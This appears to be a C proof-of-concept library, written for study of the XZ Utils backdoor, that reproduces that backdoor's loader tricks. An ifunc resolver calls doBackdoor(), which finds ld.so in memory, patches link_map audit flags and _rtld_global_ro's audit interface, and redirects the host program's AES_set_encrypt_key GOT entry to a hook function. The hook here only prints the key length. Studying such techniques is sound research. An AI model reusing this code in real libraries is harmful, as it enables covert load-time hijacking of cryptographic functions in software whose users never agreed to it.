// testlib.c
// gcc -g testlib.c -o libtest.so -shared -fPIC
// 从 XZ 后门学奇技淫巧 https://paper.seebug.org/3160/
#include "testlib.h"

extern const void * __tls_get_addr ();
extern void *_GLOBAL_OFFSET_TABLE_; 
void *ld_base_addr = 0;

struct audit_ifaces dl_audit;
void **aes_func_got;

void foo_1()
{
	printf("This is foo1\n");
}

void foo_2()
{
	printf("This is foo2\n");
}

void hook_aes_func(char *key, int length, char *enc_key)
{
    printf("do hook_aes_func\nlength = %d\n", length);
}

uint64_t install_hook(Elf64_Sym *a1, void *a2, void *a3, void *a4, void *a5, char *sym_name)
{
    printf("do install_hook, sym_name = %s\n", sym_name);
    if (!strcmp(sym_name, "AES_set_encrypt_key"))
    {
        *aes_func_got = &hook_aes_func;
        a1->st_value = &hook_aes_func;
    }
    return a1->st_value;
}

void *findLdBase()
{
	void * tls_get_addr = __tls_get_addr;
	void *ld_end_addr = 0;
	ld_base_addr = (void *)((uint64_t)tls_get_addr & 0xFFFFFFFFFFFFF000);
	ld_end_addr = ld_base_addr - 0x20000;
	while (memcmp(ld_base_addr, "\x7F""ELF", 4))
	{
		ld_base_addr -= 0x1000;
		if (ld_base_addr == ld_end_addr) {
			printf("findLdBase Error.\n");
			return (void *)-1;
		}
	}
	printf("success find ld base addr: %p\n", ld_base_addr);
	return ld_base_addr;
}

void *findSymAddr(void *addr, const char *symbol, int mode) {
    Elf64_Ehdr *ehdr = (Elf64_Ehdr *)addr;
    Elf64_Phdr *phdr = (Elf64_Phdr *)(addr + ehdr->e_phoff);
    Elf64_Dyn *dyn = NULL;
    Elf64_Sym *symtab = NULL;
    char *strtab = NULL;
    void (*symAddr)();
    Elf64_Rela* relas = NULL;
    int rela_count = 0;

    for (int i = 0; i < ehdr->e_phnum; i++) {
        if (phdr[i].p_type == PT_DYNAMIC) {
            dyn = (Elf64_Dyn *)(addr + phdr[i].p_vaddr);
            break;
        }
    }

    if (dyn == NULL) {
        printf("Dynamic segment not found.\n");
        return NULL;
    }

    for (int i = 0; dyn[i].d_tag != DT_NULL; i++) {
        if (dyn[i].d_tag == DT_SYMTAB) {
            symtab = (Elf64_Sym *)(dyn[i].d_un.d_ptr);
        }
        else if (dyn[i].d_tag == DT_STRTAB) {
            strtab = (char *)(dyn[i].d_un.d_ptr);
        }
        else if (dyn[i].d_tag == DT_JMPREL) {
            relas = (Elf64_Rela*) ((char*)dyn[i].d_un.d_ptr);
        }
        else if (dyn[i].d_tag == DT_PLTRELSZ) {
            rela_count = dyn[i].d_un.d_ptr / sizeof(Elf64_Rela);
        }
    }

    if (symtab == NULL || strtab == NULL) {
        printf("Symbol table or string table not found.\n");
        return NULL;
    }

    if (mode == 1 && relas == NULL)
    {
        printf("rela table not found.\n");
        return NULL;
    }

    if (mode == 1)
    {
        for (int i = 0; i < rela_count; i++) {
            Elf64_Sym* sym = &symtab[ELF64_R_SYM(relas[i].r_info)];
            if (strcmp(strtab + sym->st_name, symbol) == 0) {
                symAddr = (void *)addr + relas[i].r_offset;
                printf("Symbol %s got found at address %p\n", symbol, symAddr);
                return symAddr;
            }
        }
    }
    else {
        for (int i = 0; &symtab[i] < strtab; i++) {
            if (strcmp(strtab + symtab[i].st_name, symbol) == 0) {
                symAddr = (void *)addr + symtab[i].st_value;
                printf("Symbol %s found at address %p\n", symbol, symAddr);
                return symAddr;
            }
        }
    }
    printf("Symbol %s not found.\n", symbol);
    return NULL;
}

void setAuditPtr(struct link_map *r_map)
{
    // set l_audit_any_plt
    char *l_name;
    struct link_map *elf_ptr = 0;
    struct link_map *libcrypto_ptr = 0;
    char plt;
    while (1)
    {
        
        if (r_map->l_name && *(char *)r_map->l_name == 0)
        {
            printf("name = %s, addr = %p, ld addr = %p\n", r_map->l_name, r_map->l_addr, r_map->l_ld);
            elf_ptr = r_map;
            aes_func_got = findSymAddr(r_map->l_addr, "AES_set_encrypt_key", 1);
        }
        else if (strstr(r_map->l_name, "libcrypto.so.3"))
        {
            printf("name = %s, addr = %p, ld addr = %p\n", r_map->l_name, r_map->l_addr, r_map->l_ld);
            libcrypto_ptr = r_map;
        }
        if (!r_map->l_next)
            break;
        r_map = r_map->l_next;
    }
    if (!elf_ptr)
    {
        printf("get elf link_map error\n");
        return;
    }
    printf("success get elf link_map = %p\n", elf_ptr);
    // 因为导入的是/usr/include/link.h中的struct link_map结构体，不存在l_audit_any_plt变量，直接使用glibc的elf/link.h需要解决太多错误，所以这里直接用偏移。
    plt = *((char *)elf_ptr + 0x31e);
    *((char *)elf_ptr + 0x31e) = plt | 1;

    // 设置bindflags
    *((char *)elf_ptr + 0x488 + 8) = 2;
    *((char *)libcrypto_ptr + 0x488 + 8) = 1;
}

int doBackdoor()
{
	int status;
	void (*ldBaseAddr)();
	void (*libc_stack_end)();
    void *rtld_global_ro;
	struct r_debug* rc_debug;
    int *dl_naudit;
    struct audit_ifaces **dl_audit_ptr;

	ldBaseAddr = findLdBase();
	if ((int64_t)ldBaseAddr <= 0)
		goto error;
    rc_debug = findSymAddr(ldBaseAddr, "_r_debug", 0);
    setAuditPtr(rc_debug->r_map);

    rtld_global_ro = findSymAddr(ldBaseAddr, "_rtld_global_ro", 0);
    dl_naudit = rtld_global_ro + 920;
    *dl_naudit = 1;
    dl_audit_ptr = rtld_global_ro + 912;
    dl_audit.symbind64 = install_hook;
    *dl_audit_ptr = &dl_audit;
	error:
	return -1;
}

void foo() __attribute__((__ifunc__("foo_resolver")));
foo_t foo_resolver()
{
	char *path;
	printf("do foo_resolver\n");
	doBackdoor();
	path = getenv("PATH");
	if (path)
		return foo_1;
	else
		return foo_2;
}